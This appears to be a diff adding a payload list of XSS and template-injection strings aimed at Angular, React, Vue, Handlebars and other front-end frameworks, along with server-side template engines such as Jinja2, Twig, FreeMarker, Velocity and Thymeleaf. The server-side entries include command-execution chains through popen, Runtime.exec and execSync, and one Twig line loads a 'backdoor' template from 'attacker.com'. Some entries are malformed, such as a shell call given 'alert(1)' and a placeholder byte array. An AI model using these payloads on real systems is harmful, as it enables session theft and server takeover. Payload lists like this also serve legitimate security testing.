@@ -1,0 +1,240 @@
+# Framework Bypass Payloads
+# Modern framework-specific XSS payloads
+# Target Angular, React, Vue, and server-side template engines
+
+# ===== Angular Template Injection =====
+# Angular 1.x (AngularJS)
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('alert(document.domain)')()}}
+{{constructor.constructor('alert(document.cookie)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{x='constructor';this[x].constructor('alert(1)')()}}
+
+# Angular expressions
+{{7*7}}
+{{this.constructor.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+
+# Angular sandbox escapes
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+
+# Angular 2+ (modern Angular)
+<input [value]="constructor.constructor('alert(1)')()">
+<div [innerHTML]="'<img src=x onerror=alert(1)>'"></div>
+<img [src]="'x'" (error)="alert(1)">
+
+# Angular event binding
+<button (click)="constructor.constructor('alert(1)')()">Click</button>
+<div (mouseover)="constructor.constructor('alert(1)')()">Hover</div>
+
+# ===== React Bypass Payloads =====
+# React dangerouslySetInnerHTML
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>
+<div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}></div>
+
+# React href JavaScript protocol
+<a href="javascript:alert(1)">Click</a>
+<a href="javascript:alert(document.domain)">Click</a>
+
+# React event handlers  
+<button onClick={()=>alert(1)}>Click</button>
+<div onMouseOver={()=>alert(1)}>Hover</div>
+<img src="x" onError={()=>alert(1)}/>
+
+# JSX injection
+<div>{alert(1)}</div>
+<div>{'<img src=x onerror=alert(1)>'}</div>
+
+# React props injection
+<Component prop={alert(1)}/>
+<Component onClick={alert(1)}/>
+
+# ===== Vue.js Template Injection =====
+# Vue 2.x
+{{constructor.constructor('alert(1)')()}}
+{{_c.constructor('alert(1)')()}}
+{{''.constructor.constructor('alert(1)')()}}
+
+# Vue v-html directive
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div v-html="'<script>alert(1)</script>'"></div>
+
+# Vue event binding
+<button v-on:click="constructor.constructor('alert(1)')()">Click</button>
+<div @click="constructor.constructor('alert(1)')()">Click</div>
+<img v-on:error="constructor.constructor('alert(1)')()">
+
+# Vue 3.x
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<template v-if="constructor.constructor('alert(1)')()"></template>
+
+# ===== Server-Side Template Injection (SSTI) =====
+# Jinja2 (Python - Flask, Django)
+{{config.__class__.__init__.__globals__['os'].popen('alert(1)').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[414]('alert(1)',shell=True)}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('alert(1)').read()}}
+{{''.join(request.args.values())}}
+{{config.items()}}
+
+# Jinja2 XSS
+{{7*7}}
+{{request.args.x}}
+{{config}}
+{{"<script>alert(1)</script>"}}
+
+# Twig (PHP - Symfony)
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("alert(1)")}}
+{{_self.env.setCache("ftp://attacker.com")}}{{_self.env.loadTemplate("backdoor")}}
+
+# FreeMarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("alert(1)") }
+${.now}
+${product.name}
+${"<script>alert(1)</script>"}
+
+# Velocity (Java)
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+$rt.getRuntime().exec('alert(1)')
+
+# Handlebars (JavaScript)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return alert(1);"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Pug/Jade (Node.js)
+#{7*7}
+#{global.process.mainModule.require('child_process').execSync('alert(1)')}
+
+# ===== GraphQL Injection =====
+# GraphQL query injection
+{__schema{types{name,fields{name}}}}
+{__type(name:"Query"){fields{name,args{name,type{name}}}}}
+
+# ===== AJAX/Fetch XSS =====
+# XMLHttpRequest injection
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','javascript:alert(1)');xhr.send();</script>
+
+# Fetch API injection
+<script>fetch('javascript:alert(1)')</script>
+
+# ===== Web Components =====
+# Custom elements
+<custom-element><script>alert(1)</script></custom-element>
+<shadow-root><script>alert(1)</script></shadow-root>
+
+# ===== Polymer Framework =====
+<dom-module id="x"><template><script>alert(1)</script></template></dom-module>
+
+# ===== Ember.js =====
+{{#if (action "alert(1)")}}XSS{{/if}}
+{{outlet}}
+
+# ===== Backbone.js =====
+<%= alert(1) %>
+<%- "<script>alert(1)</script>" %>
+
+# ===== Knockout.js =====
+<div data-bind="html: '<img src=x onerror=alert(1)>'"></div>
+<script>ko.applyBindings({x: alert(1)})</script>
+
+# ===== Meteor Framework =====
+{{#if currentUser}}{{currentUser.constructor.constructor('alert(1)')()}}{{/if}}
+
+# ===== Next.js (React) =====
+<div dangerouslySetInnerHTML={{__html: props.userInput}}></div>
+<Script src="javascript:alert(1)"/>
+
+# ===== Nuxt.js (Vue) =====
+<div v-html="$route.query.xss"></div>
+<client-only><script>alert(1)</script></client-only>
+
+# ===== Svelte =====
+{@html '<img src=x onerror=alert(1)>'}
+{@html userInput}
+
+# ===== Alpine.js =====
+<div x-html="'<img src=x onerror=alert(1)>'"></div>
+<button @click="$eval('alert(1)')">Click</button>
+
+# ===== Lit (Web Components) =====
+<script>import {html} from 'lit'; html`<img src=x onerror=alert(1)>`;</script>
+
+# ===== Mustache Templates =====
+{{& "<script>alert(1)</script>" }}
+{{{ "<script>alert(1)</script>" }}}
+
+# ===== EJS (Embedded JavaScript) =====
+<%- "<script>alert(1)</script>" %>
+<%= alert(1) %>
+
+# ===== Nunjucks (Node.js) =====
+{{7*7}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('alert(1)')")()}}
+
+# ===== Thymeleaf (Java) =====
+<div th:utext="${userInput}"></div>
+[[${T(java.lang.Runtime).getRuntime().exec('alert(1)')}]]
+
+# ===== ASP.NET Razor =====
+@Html.Raw("<script>alert(1)</script>")
+@{var x = "<script>alert(1)</script>";}@Html.Raw(x)
+
+# ===== Blade (Laravel) =====
+{!! "<script>alert(1)</script>" !!}
+{!! $userInput !!}
+
+# ===== Smarty (PHP) =====
+{$smarty.get.xss}
+{literal}<script>alert(1)</script>{/literal}
+
+# ===== Django Templates =====
+{{request.GET.xss|safe}}
+{% autoescape off %}{{userInput}}{% endautoescape %}
+
+# ===== Ruby on Rails =====
+<%= raw "<script>alert(1)</script>" %>
+<%= params[:xss].html_safe %>
+
+# ===== Express.js / EJS =====
+<%- userInput %>
+<%= eval('alert(1)') %>
+
+# ===== Prototype Pollution leading to XSS =====
+constructor.prototype.xss=alert(1)
+__proto__.xss=alert(1)
+Object.prototype.xss=alert(1)
+
+# ===== TypeScript with unsafe types =====
+<div innerHTML={userInput as any}></div>
+{userInput as string}
+
+# ===== WebAssembly XSS vectors =====
+<script>WebAssembly.instantiate(new Uint8Array([...]), {}).then(m=>m.instance.exports.main());</script>
+
+# ===== Service Worker XSS =====
+<script>navigator.serviceWorker.register('data:application/javascript,alert(1)')</script>
+
+# ===== DOM Clobbering for framework bypass =====
+<form name="x"><input name="action" value="javascript:alert(1)"></form>
+<form name="document"><input name="cookie"></form>
